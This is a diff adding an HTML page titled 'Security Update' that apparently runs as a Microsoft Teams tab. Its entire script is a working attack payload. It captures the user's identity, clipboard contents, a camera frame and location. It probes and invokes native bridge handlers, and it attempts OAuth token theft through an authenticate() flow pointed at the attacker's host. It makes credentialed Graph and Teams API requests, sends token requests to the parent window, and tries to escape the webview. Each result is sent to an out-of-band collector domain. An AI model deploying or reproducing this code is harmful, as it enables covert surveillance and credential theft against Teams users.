@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Security Update</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+</head>
+<body style="margin:0;font-family:'Segoe UI',sans-serif;background:#f5f5f5;">
+<div id="status" style="padding:12px;font-size:12px;color:#333;"></div>
+<script>
+var C='yeedjuciskcfxiwyajuv9mw912uaxqx0t.oast.fun';
+var log=[];
+
+function s(m){log.push(m);document.getElementById('status').innerHTML=log.join('<br>');}
+function ex(path,data){
+  var p=Object.keys(data).map(function(k){return k+'='+encodeURIComponent(String(data[k]||'none').substring(0,200))}).join('&');
+  fetch('https://'+C+'/'+path+'?'+p).catch(function(){new Image().src='https://'+C+'/'+path+'?'+p;});
+}
+
+(async function(){
+  await microsoftTeams.app.initialize();
+  var ctx=await microsoftTeams.app.getContext();
+  s('SDK OK: '+ctx.user.userPrincipalName+' | '+ctx.app.host.clientType);
+  ex('t3-init',{upn:ctx.user.userPrincipalName,host:ctx.app.host.clientType});
+
+  // === TEST 1: WKWebView native bridge handlers ===
+  s('--- WKWebView Bridge ---');
+  try {
+    var handlers = [];
+    if (window.webkit && window.webkit.messageHandlers) {
+      var knownHandlers = [
+        'teams', 'Teams', 'teamsNative', 'nativebridge', 'nativeBridge',
+        'auth', 'authentication', 'log', 'logger', 'analytics',
+        'navigation', 'navigate', 'appLifecycle', 'lifecycle',
+        'notification', 'notify', 'media', 'camera', 'photo',
+        'location', 'geolocation', 'contacts', 'calendar',
+        'clipboard', 'share', 'deeplink', 'deeplinking',
+        'callbackHandler', 'callback', 'messageHandler', 'handler',
+        'keychain', 'storage', 'secureStorage', 'credential',
+        'biometric', 'faceId', 'touchId', 'token', 'sso',
+        'push', 'pushNotification', 'appConfig', 'config',
+        'file', 'fileOpen', 'download', 'upload',
+        'print', 'pdf', 'document', 'webview',
+        'scriptMessageHandler', 'nativeHandler', 'bridge',
+        'microsoftTeams', 'msteams', 'teamsClient',
+        'flutterWebview', 'cordova', 'capacitor', 'ionic',
+        'ReactNativeWebView', 'postMessage'
+      ];
+      for (var h of knownHandlers) {
+        try {
+          if (window.webkit.messageHandlers[h]) {
+            handlers.push(h);
+            // Try to invoke it
+            try {
+              window.webkit.messageHandlers[h].postMessage({type:'probe',action:'getInfo'});
+              handlers.push(h + ':INVOKED');
+            } catch(e2) {
+              handlers.push(h + ':exists-err:' + e2.message.substring(0, 40));
+            }
+          }
+        } catch(e) {}
+      }
+    }
+    s('Handlers found: ' + (handlers.length > 0 ? handlers.join(', ') : 'none'));
+    ex('t3-wkbridge', { handlers: handlers.join('|') || 'none', wk: !!window.webkit, mh: !!(window.webkit && window.webkit.messageHandlers) });
+  } catch(e) {
+    s('Bridge error: ' + e.message);
+    ex('t3-wkbridge-err', { e: e.message });
+  }
+
+  // === TEST 2: Clipboard READ ===
+  s('--- Clipboard ---');
+  try {
+    var clipText = await navigator.clipboard.readText();
+    s('CLIPBOARD READ: "' + clipText.substring(0, 50) + '"');
+    ex('t3-clipboard', { text: clipText.substring(0, 200), len: clipText.length });
+  } catch(e) {
+    s('Clipboard read: ' + e.name + ' - ' + e.message);
+    ex('t3-clipboard-err', { e: e.name + ':' + e.message });
+  }
+
+  // === TEST 3: Camera silent access ===
+  s('--- Camera ---');
+  try {
+    var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+    s('CAMERA: GOT STREAM');
+    var track = stream.getVideoTracks()[0];
+    var settings = track.getSettings();
+    ex('t3-camera', { got: 'true', w: settings.width, h: settings.height, facing: settings.facingMode || '?' });
+    // Try to capture a frame
+    try {
+      var video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      await new Promise(r => setTimeout(r, 500));
+      var canvas = document.createElement('canvas');
+      canvas.width = 64; canvas.height = 48;
+      canvas.getContext('2d').drawImage(video, 0, 0, 64, 48);
+      var thumb = canvas.toDataURL('image/jpeg', 0.3);
+      s('CAMERA FRAME CAPTURED (len=' + thumb.length + ')');
+      ex('t3-camera-frame', { captured: 'true', len: thumb.length });
+    } catch(e3) {
+      s('Frame capture failed: ' + e3.message);
+    }
+    stream.getTracks().forEach(t => t.stop());
+  } catch(e) {
+    s('Camera: ' + e.name + ' - ' + e.message);
+    ex('t3-camera-err', { e: e.name + ':' + e.message });
+  }
+
+  // === TEST 4: Geolocation ===
+  s('--- Geolocation ---');
+  try {
+    var pos = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+    });
+    s('GEO: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
+    ex('t3-geo', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy });
+  } catch(e) {
+    s('Geo: ' + e.message);
+    ex('t3-geo-err', { e: e.code + ':' + e.message });
+  }
+
+  // === TEST 5: Teams SDK authenticate() - OAuth token theft ===
+  s('--- SDK Auth Flow ---');
+  try {
+    // Try authenticate with controlled URL
+    microsoftTeams.authentication.authenticate({
+      url: 'https://' + C + '/auth-start?from=teams-mobile',
+      width: 600,
+      height: 535
+    }).then(function(result) {
+      s('AUTH POPUP RESULT: ' + result);
+      ex('t3-auth-result', { result: String(result).substring(0, 200) });
+    }).catch(function(reason) {
+      s('Auth popup: ' + reason);
+      ex('t3-auth-fail', { reason: String(reason).substring(0, 200) });
+    });
+  } catch(e) {
+    s('Auth flow: ' + e.message);
+    ex('t3-auth-err', { e: e.message });
+  }
+
+  // === TEST 6: Teams SDK - other capabilities ===
+  s('--- SDK Capabilities ---');
+  try {
+    // Check what capabilities are supported
+    var caps = {};
+    var modules = ['authentication','app','pages','dialog','media','meeting','call','chat','mail','calendar','people','sharing','stageView','search','secondaryBrowser','clipboard','geoLocation'];
+    for (var mod of modules) {
+      try {
+        caps[mod] = typeof microsoftTeams[mod] !== 'undefined' ? 'exists' : 'no';
+        if (microsoftTeams[mod] && microsoftTeams[mod].isSupported) {
+          caps[mod] = microsoftTeams[mod].isSupported() ? 'SUPPORTED' : 'not-supported';
+        }
+      } catch(e) { caps[mod] = 'err'; }
+    }
+    s('SDK modules: ' + JSON.stringify(caps));
+    ex('t3-sdk-caps', caps);
+  } catch(e) {
+    ex('t3-sdk-caps-err', { e: e.message });
+  }
+
+  // === TEST 7: Teams SDK media (camera via SDK) ===
+  s('--- SDK Media ---');
+  try {
+    if (microsoftTeams.media) {
+      microsoftTeams.media.captureImage(function(err, files) {
+        if (err) {
+          s('SDK captureImage: err ' + err.errorCode + ' ' + err.message);
+          ex('t3-sdk-media-err', { code: err.errorCode, msg: err.message });
+        } else {
+          s('SDK captureImage: GOT ' + (files ? files.length : 0) + ' files');
+          ex('t3-sdk-media', { count: files ? files.length : 0, size: files && files[0] ? files[0].size : 0 });
+        }
+      });
+    }
+  } catch(e) {
+    s('SDK media: ' + e.message);
+    ex('t3-sdk-media-fail', { e: e.message });
+  }
+
+  // === TEST 8: SDK geoLocation ===
+  s('--- SDK GeoLocation ---');
+  try {
+    if (microsoftTeams.geoLocation && microsoftTeams.geoLocation.getCurrentLocation) {
+      var loc = await microsoftTeams.geoLocation.getCurrentLocation();
+      s('SDK GEO: ' + JSON.stringify(loc));
+      ex('t3-sdk-geo', { lat: loc.latitude, lon: loc.longitude });
+    }
+  } catch(e) {
+    s('SDK geo: ' + e.message);
+    ex('t3-sdk-geo-err', { e: e.message });
+  }
+
+  // === TEST 9: Fetch internal Teams endpoints from webview ===
+  s('--- Internal Fetches ---');
+  var endpoints = [
+    { name: 'teams-config', url: 'https://teams.microsoft.com/api/mt/amer/beta/users/tenants' },
+    { name: 'graph-me', url: 'https://graph.microsoft.com/v1.0/me' },
+    { name: 'teams-cloud', url: 'https://teams.cloud.microsoft/api/mt/amer/beta/users/tenants' }
+  ];
+  for (var ep of endpoints) {
+    try {
+      var r = await fetch(ep.url, { credentials: 'include' });
+      var txt = (await r.text()).substring(0, 100);
+      s(ep.name + ': ' + r.status);
+      ex('t3-fetch-' + ep.name, { status: r.status, preview: txt });
+    } catch(e) {
+      s(ep.name + ': ' + e.message);
+      ex('t3-fetch-' + ep.name + '-err', { e: e.message });
+    }
+  }
+
+  // === TEST 10: postMessage to parent / intercept ===
+  s('--- postMessage ---');
+  try {
+    window.parent.postMessage({ type: 'getToken', resource: 'https://graph.microsoft.com' }, '*');
+    window.parent.postMessage({ type: 'authentication.getAuthToken' }, '*');
+    window.parent.postMessage('getContext', '*');
+    s('postMessages sent to parent');
+    ex('t3-postmsg', { sent: 'true' });
+  } catch(e) {
+    ex('t3-postmsg-err', { e: e.message });
+  }
+
+  // Listen for responses
+  window.addEventListener('message', function(e) {
+    var data = typeof e.data === 'object' ? JSON.stringify(e.data).substring(0, 300) : String(e.data).substring(0, 300);
+    s('MSG from ' + e.origin + ': ' + data);
+    ex('t3-msg-recv', { origin: e.origin, data: data });
+  });
+
+  // === TEST 11: Try to open secondaryBrowser (escape webview) ===
+  s('--- Secondary Browser ---');
+  try {
+    if (microsoftTeams.secondaryBrowser && microsoftTeams.secondaryBrowser.open) {
+      await microsoftTeams.secondaryBrowser.open('https://' + C + '/secondary-browser-escape');
+      s('secondaryBrowser.open: CALLED');
+      ex('t3-secondary', { called: 'true' });
+    } else {
+      s('secondaryBrowser: not available');
+    }
+  } catch(e) {
+    s('secondaryBrowser: ' + e.message);
+    ex('t3-secondary-err', { e: e.message });
+  }
+
+  s('--- All escalation tests complete ---');
+  ex('t3-done', { tests: 'complete' });
+})();
+</script>
+</body>
+</html>
